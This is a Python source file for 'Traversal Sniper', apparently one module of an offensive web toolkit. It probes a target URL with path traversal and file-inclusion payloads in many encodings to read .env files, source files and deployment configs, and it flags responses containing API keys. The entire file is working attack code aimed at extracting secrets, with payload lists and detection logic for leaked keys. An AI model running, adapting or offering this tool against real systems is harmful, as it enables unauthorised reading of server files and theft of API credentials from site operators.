"""
traversal_sniper.py — Path Traversal / LFI probe for .env and config files.

Crafts traversal payloads across common static roots and file-serving endpoint
patterns. When a target leaks its absolute app root in a stack trace, feed it in
with --app-root to add precise absolute-path payloads for that specific depth.
"""
import sys, os, argparse, urllib.parse, json, re

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

TARGETS = [".env", ".env.local", ".env.production", ".env.development",
           "package.json", "server.js", "index.js", "app.js", ".env.example"]

TRAVERSALS = [
    "../", "../../", "../../../", "../../../../", "../../../../../",
    "%2e%2e%2f", "%2e%2e/", "..%2f",
    "%252e%252e%252f", "%252e%252e/",
    "..\\", "..%5c", "%2e%2e%5c",
    "..%2F", "..%5C",
    "%c0%ae%c0%ae/", "%c0%ae%c0%ae%c0%af",
    "%e2%80%ae", "\u2025/",
    "%00../",
    "static/../", "assets/../", "public/../",
    "dist/../", "build/../", "src/../",
    "static/../../", "assets/../../",
]

STATIC_ROOTS = [
    "/",
    "/static/",
    "/assets/",
    "/public/",
    "/files/",
    "/img/",
    "/js/",
    "/css/",
    "/api/static/",
]

PRECISE_TRAVERSALS = [
    "/../.env",
    "/../../.env",
    "/../../../.env",
    "/../server.js",
    "/../index.js",
    "/../package.json",
    "/../.env.local",
    "/%2e%2e/.env",
    "/%2e%2e/%2e%2e/.env",
    "/%2e%2e/server.js",
    "/%2e%2e%2f.env",
    "/%2e%2e%2f%2e%2e%2f.env",
    "/static/../.env",
    "/assets/../.env",
    "/js/../.env",
    "/css/../.env",
]

WINDOWS_PATHS = [
    "/../../../../../../windows/win.ini",
    "/..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
    "/../../../../../../windows/system32/drivers/etc/hosts",
    "/..%2F..%2F..%2F..%2F..%2F.env",
    "/..\\..\\..\\.env",
    "/..%5C..%5C..%5C.env",
]


def _absolute_root_payloads(app_root):
    root = (app_root or "").strip().rstrip("/\\")
    if not root:
        return []
    sep = "\\" if (":" in root[:3] or "\\" in root) else "/"
    payloads = []
    for target in (".env", ".env.local", "server.js", "package.json"):
        raw = f"/{root}{sep}{target}"
        payloads.append(raw)
        payloads.append("/" + urllib.parse.quote(f"{root}{sep}{target}", safe=""))
    return payloads

PARAM_TRAVERSALS = [
    "/api/health?file=../.env",
    "/api/health?path=../.env",
    "/api/config?file=../.env",
    "/api/config?include=../.env",
    "/api/config?load=../.env",
    "/api/chat?template=../../.env",
    "/api/chat?persona=../../.env",
]


class TraversalSniper(VibeTool):
    def __init__(self):
        super().__init__("Traversal Sniper", "Targeted Path Traversal for .env Key Extraction")
        self.hits = []

    def _try_path(self, base, path, label=""):
        """
        FIX: was using raw urllib.request.urlopen(), bypassing VibeTool session/cookie/UA stack.
             Now uses self.safe_request() so auth headers, cookie jar, WAF retry, and proxy
             settings all apply consistently with the rest of the framework.
        FIX: exception path was silently swallowing all connection errors as (0, "").
             Now logs them at warn level so investigation flow is preserved.
        """
        url = base + path
        status, body, headers = self.safe_request(url, timeout=5)
        ct = headers.get("Content-Type", "") if headers else ""
        if status == 200 and body:
            is_interesting = (
                "OPENROUTER" in body or
                "API_KEY" in body or
                "sk-or" in body or
                "sk-" in body or
                re.search(r"[A-Z_]+=.{10,}", body) or
                ("html" not in ct.lower() and len(body) > 20)
            )
            if is_interesting:
                self.log(f"[HIT] {path} ({len(body)}b, {ct}): {body[:300]}", "hack")
                self.hits.append((path, body[:500]))
            else:
                self.log(f"[200 but meh] {path}: {body[:80]}")
        elif status != 0 and status not in (404, 405):
            self.log(f"[{status}] {path}")
        elif status == 0 and body:
            # connection error — body contains the exception string from safe_request
            self.log(f"  [ERR] {path}: {body[:60]}", "warn")
        return status, body

    def vector_precise(self, base):
        self.log("=== PRECISE: Known Path Traversal ===")
        for path in PRECISE_TRAVERSALS:
            self._try_path(base, path, "precise")

    def vector_static_roots(self, base):
        self.log("=== STATIC ROOTS: Static File Endpoint Traversal ===")
        for root in STATIC_ROOTS:
            for target in TARGETS[:4]:
                for traversal in ["../", "../../", "../../../", "%2e%2e/"]:
                    path = root + traversal + target
                    self._try_path(base, path)

    def vector_windows(self, base):
        self.log("=== WINDOWS: Windows Absolute Path Injection ===")
        for path in WINDOWS_PATHS:
            self._try_path(base, path)

    def vector_params(self, base):
        self.log("=== PARAMS: Parameter-Based LFI ===")
        for path in PARAM_TRAVERSALS:
            self._try_path(base, path)

    def vector_known_files(self, base):
        self.log("=== KNOWN FILES: Direct Access to Common Files ===")
        paths = [
            "/package.json",
            "/package-lock.json",
            "/.env",
            "/.env.example",
            "/server.js",
            "/index.js",
            "/app.js",
            "/config.js",
            "/webpack.config.js",
            "/vite.config.js",
            "/next.config.js",
            "/vercel.json",
            "/render.yaml",
            "/.github/workflows/deploy.yml",
            "/Dockerfile",
            "/docker-compose.yml",
        ]
        for p in paths:
            s, body = self._try_path(base, p)
            if s == 200 and body:
                self.log(f"  [ACCESSIBLE] {p}: {body[:200]}", "warn")

    def vector_api_file_serve(self, base):
        self.log("=== API FILE SERVE: Endpoint-Based File Access ===")
        payloads = [
            "/api/file?name=.env",
            "/api/file?path=.env",
            "/api/file?f=.env",
            "/api/file?filename=.env",
            "/api/serve?file=.env",
            "/api/resource?path=.env",
            "/api/download?file=.env",
            "/api/export?file=.env",
            "/api/read?file=.env",
            "/api/open?file=.env",
            "/api/file?name=%2e%2e%2f.env",
            "/api/file?path=..%2F.env",
            "/api/file?name=..%5C.env",
        ]
        for p in payloads:
            s, body = self._try_path(base, p)
            if s not in (404, 405, 0):
                self.log(f"  [{s}] {p}: {body[:150]}", "warn" if s == 200 else "info")

    def run(self, url, app_root=""):
        self.banner()
        base = url.rstrip("/")

        self.vector_precise(base)
        self.vector_known_files(base)
        self.vector_api_file_serve(base)
        self.vector_static_roots(base)
        self.vector_windows(base)
        self.vector_params(base)

        absolute = _absolute_root_payloads(app_root)
        if absolute:
            self.log("=== ABSOLUTE: Operator-supplied app-root payloads ===")
            for path in absolute:
                self._try_path(base, path)

        self.log("================================")
        if self.hits:
            self.log(f"TRAVERSAL CONFIRMED — {len(self.hits)} file(s) read!", "hack")
            for path, content in self.hits:
                self.log(f"  {path}:", "hack")
                self.log(f"  {content}", "hack")
        else:
            self.log("No traversal confirmed. Static files properly jailed.", "warn")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--app-root", default="",
                        help="Absolute app root leaked in a stack trace, to build precise payloads")
    parser.add_argument("-v", "--version", action="version", version="Traversal Sniper 1.0.0")
    args = parser.parse_args()
    TraversalSniper().run(args.url, app_root=args.app_root)
